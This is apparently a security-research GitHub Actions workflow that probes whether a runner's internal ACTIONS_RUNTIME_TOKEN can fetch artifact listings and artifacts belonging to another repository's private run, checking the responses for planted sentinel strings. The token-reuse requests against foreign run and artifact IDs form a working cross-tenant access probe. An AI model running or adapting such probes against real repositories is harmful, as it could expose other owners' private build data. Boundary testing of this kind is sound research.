name: g01-runtime-token-boundary-v3

on:
  push:
  workflow_dispatch:

jobs:
  probe:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      actions: read
    env:
      GH_TOKEN: ${{ github.token }}
      FOREIGN_OWNER: apexblkw-ow-2lt415yust
      FOREIGN_REPO: g01-private-control-20260803
      FOREIGN_RUN: '30854116091'
      FOREIGN_ARTIFACT: '8871751823'
    steps:
      - name: Create and upload owned artifact
        run: |
          mkdir -p own
          printf '%s\n' 'G01_RUNTIME_V3_SELF_SENTINEL_20260803_Z6M1' > own/sentinel.txt
      - uses: actions/upload-artifact@v4
        with:
          name: g01-runtime-v3-self-20260803-z6m1
          path: own/sentinel.txt
      - name: Probe action-process runtime boundary
        uses: actions/github-script@v7
        with:
          script: |
            const names = ['ACTIONS_RUNTIME_URL', 'ACTIONS_RESULTS_URL', 'ACTIONS_RUNTIME_TOKEN', 'ACTIONS_ID_TOKEN_REQUEST_URL'];
            for (const name of names) {
              const value = process.env[name] || '';
              const host = value.replace(/^https?:\/\//, '').split('/')[0];
              core.info(`action_env=${name} present=${value ? 'yes' : 'no'} length=${value.length} host=${host}`);
            }

            const base = (process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_RUNTIME_URL || '').replace(/\/$/, '');
            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN || '';
            if (base && runtimeToken) {
              for (const run of [process.env.GITHUB_RUN_ID, process.env.FOREIGN_RUN]) {
                const url = `${base}/_apis/pipelines/workflows/${run}/artifacts?api-version=6.0-preview`;
                const response = await fetch(url, { headers: { authorization: `Bearer ${runtimeToken}` } });
                const body = await response.text();
                core.info(`runtime_artifacts run=${run} status=${response.status} bytes=${body.length} private_sentinel=${body.includes('G01_PRIVATE_ARTIFACT_SENTINEL')} foreign_id=${body.includes(process.env.FOREIGN_ARTIFACT)}`);
              }
              for (const path of [
                `/_apis/pipelines/artifacts/${process.env.FOREIGN_ARTIFACT}?api-version=6.0-preview`,
                `/_apis/Artifacts/${process.env.FOREIGN_ARTIFACT}`,
                `/_apis/pipelines/workflows/${process.env.FOREIGN_RUN}/artifacts/${process.env.FOREIGN_ARTIFACT}?api-version=6.0-preview`
              ]) {
                const response = await fetch(`${base}${path}`, { headers: { authorization: `Bearer ${runtimeToken}` } });
                const body = await response.text();
                core.info(`runtime_foreign_path=${path} status=${response.status} bytes=${body.length} private_sentinel=${body.includes('G01_PRIVATE_ARTIFACT_SENTINEL')}`);
              }
            } else {
              core.info(`runtime_action_process_credentials_available=no base=${Boolean(base)} token=${Boolean(runtimeToken)}`);
            }

            const api = await fetch(`https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts`, {
              headers: { accept: 'application/vnd.github+json', authorization: `Bearer ${process.env.GH_TOKEN}` }
            });
            const apiBody = await api.text();
            core.info(`github_api_self_artifacts status=${api.status} bytes=${apiBody.length} own_name=${apiBody.includes('g01-runtime-v3-self-20260803-z6m1')}`);
